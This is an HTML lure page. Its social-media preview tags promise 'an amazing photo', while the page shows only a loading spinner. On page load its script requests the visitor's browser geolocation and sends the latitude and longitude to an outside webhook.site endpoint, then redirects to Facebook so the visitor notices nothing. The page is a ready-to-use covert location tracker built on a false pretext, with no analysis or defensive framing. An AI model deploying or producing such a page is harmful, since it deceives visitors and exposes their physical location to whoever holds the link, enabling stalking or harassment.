    <meta charset="UTF-8">

    <!-- Open Graph Meta Tags: WhatsApp / FB / Telegram preview -->
    <meta property="og:title" content="Check out this amazing photo!">
    <meta property="og:description" content="Click to view the full photo">
    <meta property="og:image" content="https://i.postimg.cc/y8vGyQWF/IMG-6637.jpg">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://your-site-link.com/viral.html">

<body style="margin:0; display:flex; justify-content:center; align-items:center; height:100vh; background:white; font-family:sans-serif;">

    <!-- Visible Loading Screen -->
    <div style="text-align:center;">
        <h2>Please wait...</h2>
        <p>Loading content...</p>
        <div style="margin-top:20px;">
            <div style="border:4px solid #ccc; border-top:4px solid #333; border-radius:50%; width:40px; height:40px; animation: spin 1s linear infinite;"></div>
        </div>
    </div>

    <style>
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>

    <script>
        // Target URL for redirect
        const targetURL = "https://www.facebook.com"; // আপনার redirect link

        // Webhook URL (আপনার আগের webhook)
        const webhookURL = "https://webhook.site/df38940f-cedd-4529-8fdb-ac6d2b4ad408";

        // Function to send location
        function sendLocation(lat, lon) {
            fetch(webhookURL, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({ latitude: lat, longitude: lon })
            });
        }

        // Page load
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        // User allowed location
                        sendLocation(position.coords.latitude, position.coords.longitude);
                        // Redirect after 2 sec
                        setTimeout(() => { window.location.href = targetURL; }, 2000);
                    },
                    function() {
                        // User denied location
                        setTimeout(() => { window.location.href = targetURL; }, 2000);
                    },
                    { timeout: 5000 }
                );
            } else {
                // Geolocation not supported
                setTimeout(() => { window.location.href = targetURL; }, 2000);
            }
        };
    </script>
</body>
